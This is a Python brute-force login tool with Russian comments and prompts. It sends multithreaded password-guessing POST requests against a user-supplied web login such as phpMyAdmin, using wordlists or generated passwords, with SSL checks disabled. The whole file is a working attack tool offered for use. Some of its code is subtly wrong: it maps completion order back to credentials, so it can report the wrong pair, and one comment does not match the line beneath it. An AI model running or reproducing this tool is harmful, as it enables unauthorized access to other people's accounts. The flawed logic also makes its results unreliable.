import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import sys
from functools import partial
import os
import signal

# Отключаем предупреждения о SSL-ошибках
requests.packages.urllib3.disable_warnings()


def load_wordlist(filename):
    """Загрузка словаря из файла с обработкой Windows-путей"""
    try:
        # Преобразуем путь в raw-строку для Windows
        filename = filename.strip().replace("\\", "/")
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Файл {filename} не найден!")
        sys.exit(1)


def try_login(url, username, password, timeout=2):
    """Функция проверки логина/пароля с обработкой ошибок Windows"""
    try:
        response = requests.post(
            url,
            data={'username': username, 'password': password},
            timeout=timeout,
            verify=False,
            allow_redirects=False
        )
        return response.status_code == 200
    except requests.RequestException as e:
        # Детализируем ошибки для Windows
        print(f"[DEBUG] Ошибка запроса: {str(e)}")
        return False


def brute_force(args):
    """Основная функция брутфорса с обработкой Windows-терминала"""
    print("\n[+] Начало атаки")
    print(f"[+] Цель: {args['target_url']}")
    print(f"[+] Потоков: {args['threads']}")

    # Загрузка словарей
    usernames = [args['fixed_login']] if args['fixed_login'] else load_wordlist(args['usernames_file'])
    passwords = load_wordlist(args['passwords_file']) if args['passwords_file'] else generate_passwords(args)

    print(f"[+] Логинов: {len(usernames)}")
    print(f"[+] Паролей: {len(passwords)}")
    print(f"[+] Всего комбинаций: {len(usernames) * len(passwords)}")

    start_time = time.time()
    found = False

    # Обработка прерывания Ctrl+C
    def signal_handler(sig, frame):
        print("\n[!] Прервано пользователем")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    with ThreadPoolExecutor(max_workers=args['threads']) as executor:
        futures = []
        total_attempts = 0

        for username in usernames:
            for password in passwords:
                futures.append(executor.submit(
                    partial(try_login, args['target_url'], username, password)
                ))
                total_attempts += 1

                # Вывод прогресса с учетом Windows-терминала
                if total_attempts % 100 == 0:
                    print(f"\r[~] Проверено: {total_attempts}", end='', flush=True)

                # Тестовый режим
                if args['test'] and total_attempts >= 1000:
                    print("\n[*] Тестовый режим завершен")
                    return

        for i, future in enumerate(as_completed(futures), 1):
            if future.result():
                username = usernames[(i - 1) // len(passwords)]
                password = passwords[(i - 1) % len(passwords)]
                print(f"\n\n[+] УСПЕХ: {username}:{password}")
                found = True
                executor.shutdown(wait=False)
                break

            if i % 100 == 0:
                print(f"\r[~] Проверено: {i}", end='', flush=True)

    if not found:
        print("\n\n[-] Подходящая комбинация не найдена")

    print(f"[+] Время работы: {time.time() - start_time:.2f} сек")


def generate_passwords(args):
    """Генерация паролей с защитой от переполнения памяти"""
    from itertools import product
    chars = args['character_set'] or '0123456789'

    # Ограничение длины для Windows (избегаем переполнения памяти)
    if args['max_length'] > 6:
        print("[!] Максимальная длина пароля для генерации: 6 символов")
        args['max_length'] = 6

    passwords = []
    for length in range(args['min_length'], args['max_length'] + 1):
        try:
            passwords.extend(''.join(p) for p in product(chars, repeat=length))
        except MemoryError:
            print("[!] Переполнение памяти при генерации паролей")
            sys.exit(1)
    return passwords


if __name__ == "__main__":
    # Интерактивный ввод данных
    print("=== Brute Force Tool ===")

    # Целевая система
    target_url = input("Введите URL цели (например: http://localhost/phpmyadmin): ")

    # Группа логинов
    login_choice = input("Выберите способ задания логинов:\n1. Фиксированный логин\n2. Файл с логинами\n> ")
    while login_choice not in ['1', '2']:
        login_choice = input("Некорректный выбор. Попробуйте снова: ")

    if login_choice == '1':
        fixed_login = input("Введите фиксированный логин (например: admin): ")
        usernames_file = None
    else:
        usernames_file = input("Введите путь к файлу с логинами (например: C:/wordlists/users.txt): ")
        fixed_login = None

    # Группа паролей
    password_choice = input("Выберите способ задания паролей:\n1. Файл с паролями\n2. Генерировать автоматически\n> ")
    while password_choice not in ['1', '2']:
        password_choice = input("Некорректный выбор. Попробуйте снова: ")

    if password_choice == '1':
        passwords_file = input("Введите путь к файлу с паролями (например: C:/wordlists/passwords.txt): ")
        generate_passwords_flag = False
    else:
        passwords_file = None
        generate_passwords_flag = True

    # Настройки генерации паролей
    if generate_passwords_flag:
        character_set = input("Введите набор символов для генерации паролей (например: abcdefghijklmnopqrstuvwxyz): ")
        min_length = int(input("Минимальная длина пароля (по умолчанию: 1): ") or 1)
        max_length = int(input("Максимальная длина пароля (по умолчанию: 4): ") or 4)
    else:
        character_set = None
        min_length = 1
        max_length = 4

    # Общие настройки
    threads = int(input("Количество потоков (рекомендуется 20-50): ") or 20)
    test_mode = input("Включить тестовый режим (1000 попыток)? (y/n): ").lower() == 'y'

    # Собираем аргументы
    args = {
        'target_url': target_url,
        'fixed_login': fixed_login,
        'usernames_file': usernames_file,
        'passwords_file': passwords_file,
        'generate_passwords': generate_passwords_flag,
        'character_set': character_set,
        'min_length': min_length,
        'max_length': max_length,
        'threads': threads,
        'test': test_mode
    }

    # Проверка обязательных полей
    if generate_passwords_flag and not character_set:
        print("[!] Для генерации паролей требуется указать набор символов!")
        sys.exit(1)

    # Для Windows: принудительное использование IPv4
    os.environ['REQUESTS_CA_BUNDLE'] = ''

    brute_force(args)
